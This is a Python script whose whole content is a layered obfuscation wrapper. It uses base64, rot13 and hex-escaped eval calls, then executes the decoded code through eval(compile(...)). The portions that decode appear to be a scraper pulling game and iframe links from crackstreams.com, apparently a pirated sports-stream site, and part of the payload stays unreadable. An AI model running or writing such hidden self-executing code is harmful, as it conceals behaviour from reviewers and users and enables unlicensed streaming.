
import base64, codecs
thecrew = 'DQppbXBvcnQgYmFzZTY0LCBjb2RlY3MNCnRoZWNyZXcgPSAnYVcxd2IzSjBJSEpsY1hWbGMzUnpEUXBwYlhCdmNuUWdjbVVOQ21aeWIyMGdZbk0wSUdsdGNHOXlkQ0JDWldGMWRHbG1kV3hUYjNWd0RRcHBiWEJ2Y25RZ2MzbHpEUW9OQ21kaGJXVmZiR2x6ZENBOUlGdGREUXBrWldZZ1oyVjBYMmRoYldWektDazZEUW9nSUNBZ1lXZGxiblFnUFNBblRXOTZhV3hzWVM4MUxqQWdLRmRwYm1SdmQzTWdUbFFnTmk0eE95QlhhVzQyTkRzZ2VEWTBLU0JCY0hCc1pWZGxZa3RwZEM4MU16Y3VNellnS0V0SVZFMU1MQ0JzYVd0bElFZGxZMnR2S1NCRGFISnZiV1V2TnpZdU1DNHpPREE1TGpFek1pQlRZV1poY21rdk5UTTNMak0ySncwS0lDQWdJR2gwYld3Z1BTQnlaWEYxWlhOMGN5NW5aWFFvSjJoMGRIQTZMeTlqY21GamEzTjBjbVZoYlhNdVkyOXRMMk5tWW5OMGNtVmhiWE12Snl4b1pXRmtaWEp6UFhzbmRYTmxjaTFoWjJWdWRDYzZZV2RsYm5SOUtRMEtJQ0FnSUhOdmRYQWdQU0JDWldGMWRHbG1kV3hUYjNWd0tHaDBiV3d1WTI5dWRHVnVkQ3duYUhSdGJDNXdZWEp6WlhJbktRMEtJQ0FnSUdFZ1BTQnpiM1Z3TG1acGJtUmZZV3hzS0NkaEp5eGpiR0Z6YzE4OWV5ZGlkRzRnWW5SdUxXUmxabUYxYkhRZ1luUnVMV3huSUdKMGJpMWliRzlqYXlkOUtRMEtJQ0FnSUdadmNpQmtZWFJoSUdsdUlHRTZEUW9nSUNBZ0lDQWdJSFJwZEd4bElEMGdaR0YwWVM1bWFXNWtLQ2RvTkNjc1kyeGhjM05mUFhzbmJXVmthV0V0YUdWaFpHbHVaeWQ5S1M1MFpYaDBEUW9nSUNBZ0lDQWdJSFInDQpkb2VzbnQgPSAnY3FUa3lWUTB0cVR5MG9USGhNSjV3bzJFeVhQcXVwMkFjbkZwZlcyeWFvejlsTUZwY1FEYnRWUE50VlBOdFZVRWNxVGt5VlEwdHFUeTBvVEhoTV'
doesnt = 'EWq28lEKyLHURkpIEZM0WDpTMKZayuo3b5oR1TpTAEETW0IyOBqSMDGaEJIUS1o0cWp29HrJ1kHQI1pSICrJ96ETWloURjoxgSMx1TpQMkIUxjo1EWBIuRZSuEETW0IyOBqUO6FGOkF1qbIyEkqJ9XFKAiIUygpH4jJSSRLaqjIIqwo2SRLx0lFGOYZaS1o0cWoIuDrTAEETWOHTSOZUO6FKIiEx45IyAapISRLxSDrxI5GKMCLH1YEKAjZ0IfGHcGM1uHpKIiFxuwDaDjJSMDGaEJISAuGHb1ZSMEZUEKZQScpac5Mz9HHzyOEwEdIyO1F25XAKuiZ3SgIyV1FSMEGTunE2M0FGW5nRS3EQqJIKDlDIO4qREYG2ciIRyYGHcKJJ5YETyOE1bmJKqnZyMDqIyTH0IOE1OdqT9HrJIAEx9IGHcOMJ9frUERZaIfomVkrIygpQWMq05bJz10nxWTATgnoIM0FQWGrxkYI2AMoHugDJj0oHS2pRSDqx50IyOCLaSHZJMJHGO0pUcWn3SXFJ1kIIcbGGWWZSuDpJWkIHIdDaL4nHjmI3IZZzqgpIIKrHkXZJ1MrxSco0L5q016I21kIIq5GRbkoIyfpTMhIRy1GIEWoUOgZGqKZ0ygGHgJM0kXpKyiLHEuDacGLH1XAGOmEauOHUMBqSMDG21iZ0ydIyRjqRE6FKIkF0IwGJSWMxtlBGSjHUIvpIDkMyy6DJyiLHI5o2SRMyplqGOiFzcbpSEGoUNlFJkKoUuOHUMBqSMDG3IJHGO0pQV5ZKODAKchFwI4FmWGMz9DqTSZEaOzGQWeqKNmDKAQF2MuGTSSnSMHImOiqwS4GHcAqKSXnmOJISpjo3LaQDcxolN9VPpkp1c5DzyxEmE0JJ14qyxlp25zH2gBD2yOM0yQDz1vZ0yaJxqTZSyGDaOvnHWbG2pjF0yQDJqWD0SaFHAPZTSLHaAnH0R5FHqFnTEUEKInoJk1JxAaozSRHJ5ZE05mJIuBryu6ZGqXZwSfJxqfnRkKnTkMI1WjLz1wozMGn3IxE1L0MRRjF0yQDJqWD0SaFHAPZTSLHaAnH0R5FHuFpTEUrTkZoIM1JGV5n1cGM25MJR5dLIqeoxkQMUOnZwI2L21IoxgEZRgWD0SaFHAO'
do = 'Z0lDQjBhWFJzWlNBOUlIUnBkR3hsTG1SbFkyOWtaU2duZFhSbUxUZ25MQ2RwWjI1dmNtVW5LUTBLSUNBZ0lDQWdJQ0JwWmlCbllXMWxJR2x1SUhScGRHeGxPZzBLSUNBZ0lDQWdJQ0FnSUNBZ2RYSnNJRDBnWkdGMFlWc25hSEpsWmlkZERRb2dJQ0FnSUNBZ0lDQWdJQ0IxY213Z1BTQW5hSFIwY0RvdkwyTnlZV05yYzNSeVpXRnRjeTVqYjIwbklDc2dkWEpzRFFvZ0lDQWdJQ0FnSUNBZ0lDQm9kRzFzSUQwZ2NtVnhkV1Z6ZEhNdVoyVjBLSFZ5YkN4b1pXRmtaWEp6UFhzbmRYTmxjaTFoWjJWdWRDYzZZV2RsYm5SOUtTNWpiMjUwWlc1MERRb2dJQ0FnSUNBZ0lDQWdJQ0J6YjNWd0lEMGdRbVZoZFhScFpuVnNVMjkxY0Nob2RHMXNMQ2RvZEcxc0xuQmhjbk5sY2ljcERRb2dJQ0FnSUNBZ0lDQWdJQ0JtY21GdFpTQTlJSE52ZFhBdVptbHVaQ2duYVdaeVlXMWxKeWtOQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JR1p5WVcxbE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHWnlZVzFsSUQwZ1puSmhiV1ZiSjNOeVl5ZGREUW9nSUNBZ0lDQWdJQ0FnSScNCmRyYW1hID0gJ1BOdFZQTnRvSlNtcVRJbFZRMHRweklrcUpJbXFVWmhNMkkwWFRNbExKMXlZVHV5TEpFeXBhWjlybHFsTUpNeXB6SWxXbWMxcHprOVhGNXdvMjUwTUo1MFFEYnRWUE50VlBOdFZQTnRWUE50VlBOdHAyOTFwUE45VlJXeUxLSTBuSk0xb1NBaXFLTmJvSlNtcVRJbFlQcWJxVDFmWWFPdXBhQXlwdnBjUURidFZQTnRWUE50VlBOdFZQTnRWUE50b0dBMUJQTjlWVVd5WXpBaW9LT2NvVEhiVzNBaXFLV3dNR2J0VnZ0aFhtOGNWdnBmcHpIaEVSOUhESGtaWEY1em5KNXhMSmtmWFVBMHB2dW1vM0lqWWFPbE1LRTBuSk01WEZ4QVB2TnRWUE50VlBOdFZQTnRWUE50VlBPZ1ozSDRWUTB0b0'
drama = 'qOZHWGMzcYEQOLIyOBqSMDGaEJHR50IyOBqSMDGaEJIQOgpHq0qRATG2qnZ0t0IyOzqSpmn2kAFx15pUcWoRATpUELoR96pUcGM01RZSuJHR50IyOBqSMDGaEJHR50IyOBqSMIDGOjrxy1o0L1qKOIG3yirxEvpzkkZT5YEJMAEaN2pIE5ZT9HFTMKZ0RjpUcWqJ9TpQMiE0RkDyHjL1SRLaEJHR50IyOBqSMDGaEJHR50IyOBqRkuI3yZFzMOHUMBqSMDGaEJHR50IyOBqSMHFJMjZxt2HHEvqSMDGaEJHR50IyOBqSMDGaEJHR50GTSKrHkXMxSDqx50IyOBqSMDGaEAFzggGHqvDIO2GaEJHR50IyOBqSMDGaEJIRSco2SSL29uFKyEETWOHUMBqSMDG2kAF0HkpUb0qUNmEJkAFyAaHHEvDIO0ZSuEETW3pSIKL29uETWAZxxjFmAOZUO6FKIiEaEuFUc5q01TG3IkHR9CpUbkAIMFDIERqx9gpIIKrHkXZJ1JITgwpKcVLIuTrRSDqQ09Wj0XpzImpTIwqPN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaImLJ5xrJ91VQ0tMKMuoPtaKUt3ASk4AwuprQL1KUt2Z1k4AmWprQL1KUt3AlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2Myk4AwIprQpmKUt2MIk4AmEprQWwKUtlZSk4AmWprQL1KUt3Z1k4AmOprQL1KUt2Z1k4AmEprQV5WlxtXlOyqzSfXPqprQL0KUt2MvpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt3Zyk4AwSprQMxKUt2ZIk4ZzAprQVjKUt3Zyk4AwIprQpmKUt3ZSk4AwIprQLmKUt3ASk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3AIk4AmAprQLkKUt2MIk4AwEprQp5KUt2Myk4AmHaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
respect = '\x72\x6f\x74\x31\x33'
usandyou = eval('\x74\x68\x65\x63\x72\x65\x77') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x6f\x65\x73\x6e\x74\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29') + eval('\x64\x6f') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x72\x61\x6d\x61\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29')
eval(compile(base64.b64decode(eval('\x75\x73\x61\x6e\x64\x79\x6f\x75')),'<string>','exec'))